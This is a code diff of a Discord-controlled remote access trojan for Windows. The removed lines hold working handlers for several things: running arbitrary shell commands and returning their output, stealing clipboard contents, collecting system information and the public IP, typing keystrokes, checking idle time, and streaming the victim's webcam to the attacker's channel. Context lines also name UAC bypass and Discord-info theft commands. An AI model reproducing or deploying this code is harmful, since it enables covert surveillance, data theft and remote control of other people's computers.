@@ -307,101 +307,6 @@ async def on_message(message):
                     win32gui.EnumWindows(winEnumHandler, None)
             win32gui.EnumWindows(get_all_hwnd, 0)
 
-        if message.content.startswith("!shell"):
-            global status
-            import time
-            status = None
-            import subprocess
-            import os
-            instruction = message.content[7:]
-
-            def shell():
-                output = subprocess.run(instruction, stdout=subprocess.PIPE,
-                                        shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                global status
-                status = "ok"
-                return output
-            import threading
-            shel = threading.Thread(target=shell)
-            shel._running = True
-            shel.start()
-            time.sleep(1)
-            shel._running = False
-            if status:
-                result = str(shell().stdout.decode('CP437'))
-                numb = len(result)
-                if numb < 1:
-                    await message.channel.send("[*] Command not recognized or no output was obtained")
-                elif numb > 1990:
-                    temp = (os.getenv('TEMP'))
-                    f1 = open(temp + r"\output.txt", 'a')
-                    f1.write(result)
-                    f1.close()
-                    file = discord.File(
-                        temp + r"\output.txt", filename="output.txt")
-                    await message.channel.send("[*] Command successfuly executed", file=file)
-                    dele = "del" + temp + r"\output.txt"
-                    os.popen(dele)
-                else:
-                    await message.channel.send("[*] Command successfuly executed : " + result)
-            else:
-                await message.channel.send("[*] Command not recognized or no output was obtained")
-                status = None
-
-        if message.content.startswith("!cd"):
-            import os
-            os.chdir(message.content[4:])
-            await message.channel.send("[*] Command successfuly executed")
-
-        if message.content == "!help":
-            import os
-            temp = (os.getenv('TEMP'))
-            f5 = open(temp + r"\helpmenu.txt", 'a')
-            f5.write(str(helpmenu))
-            f5.close()
-            temp = (os.getenv('TEMP'))
-            file = discord.File(temp + r"\helpmenu.txt",
-                                filename="helpmenu.txt")
-            await message.channel.send("[*] Command successfuly executed", file=file)
-            os.system(r"del %temp%\helpmenu.txt /f")
-
-        if message.content.startswith("!write"):
-            import pyautogui
-            if message.content[7:] == "enter":
-                pyautogui.press("enter")
-            else:
-                pyautogui.typewrite(message.content[7:])
-
-        if message.content == "!clipboard":
-            import ctypes
-            import os
-            CF_TEXT = 1
-            kernel32 = ctypes.windll.kernel32
-            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
-            kernel32.GlobalLock.restype = ctypes.c_void_p
-            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
-            user32 = ctypes.windll.user32
-            user32.GetClipboardData.restype = ctypes.c_void_p
-            user32.OpenClipboard(0)
-            if user32.IsClipboardFormatAvailable(CF_TEXT):
-                data = user32.GetClipboardData(CF_TEXT)
-                data_locked = kernel32.GlobalLock(data)
-                text = ctypes.c_char_p(data_locked)
-                value = text.value
-                kernel32.GlobalUnlock(data_locked)
-                body = value.decode()
-                user32.CloseClipboard()
-                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))
-
-        if message.content == "!sysinfo":
-            import platform
-            jak = str(platform.uname())
-            intro = jak[12:]
-            from requests import get
-            ip = get('https://api.ipify.org').text
-            pp = "IP Address = " + ip
-            await message.channel.send("[*] Command successfuly executed : " + intro + pp)
-
         if message.content == "!geolocate":
             import urllib.request
             import json
@@ -409,14 +314,6 @@ async def on_message(message):
                 data = json.loads(url.read().decode())
                 link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                 await message.channel.send("[*] Command successfuly executed : " + link)
-
-        if message.content == "!admincheck":
-            import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
-                await message.channel.send("[*] Congrats you're admin")
-            elif is_admin == False:
-                await message.channel.send("[!] Sorry, you're not admin")
 
         if message.content == "!uacbypass":
             import winreg
@@ -497,25 +394,6 @@ async def on_message(message):
                     ('cbSize', c_uint),
                     ('dwTime', c_int),
                 ]
-            def get_idle_duration():
-                lastInputInfo = LASTINPUTINFO()
-                lastInputInfo.cbSize = sizeof(lastInputInfo)
-                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
-                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-                    return millis / 1000.0
-                else:
-                    return 0
-
-            import threading
-            global idle1
-            idle1 = threading.Thread(target=get_idle_duration)
-            idle1._running = True
-            idle1.daemon = True
-            idle1.start()
-            duration = get_idle_duration()
-            await message.channel.send('User idle for %%.2f seconds.' % duration)
-            import time
-            time.sleep(1)
 
         if message.content.startswith("!voice"):
             volumeup()
@@ -541,42 +419,6 @@ async def on_message(message):
                 await  message.channel.send("[*] Command successfuly executed")
             else:
                 await message.channel.send("[!] Admin rights are required for this operation")
-
-        if message.content == "!streamwebcam" :
-            await message.channel.send("[*] Command successfuly executed")
-            import os
-            import time
-            import cv2
-            import threading
-            import sys
-            import pathlib
-            temp = (os.getenv('TEMP'))
-            camera_port = 0
-            camera = cv2.VideoCapture(camera_port)
-            running = message.content
-            file = temp + r"\hobo\hello.txt"
-            if os.path.isfile(file):
-                delelelee = "del " + file + r" /f"
-                os.system(delelelee)
-                os.system(r"RMDIR %temp%\hobo /s /q")
-            while True:
-                return_value, image = camera.read()
-                cv2.imwrite(temp + r"\\temp.png", image)
-                boom = discord.File(temp + r"\\temp.png", filename="temp.png")
-                kool = await message.channel.send(file=boom)
-                temp = (os.getenv('TEMP'))
-                file = temp + r"\hobo\hello.txt"
-                if os.path.isfile(file):
-                    del camera
-                    break
-                else:
-                    continue
-
-        if message.content == "!stopwebcam":
-            import os
-            os.system(r"mkdir %temp%\hobo")
-            os.system(r"echo hello>%temp%\hobo\hello.txt")
-            os.system(r"del %temp\\temp.png /F")
 
         if message.content == "!getdiscordinfo":
             import os
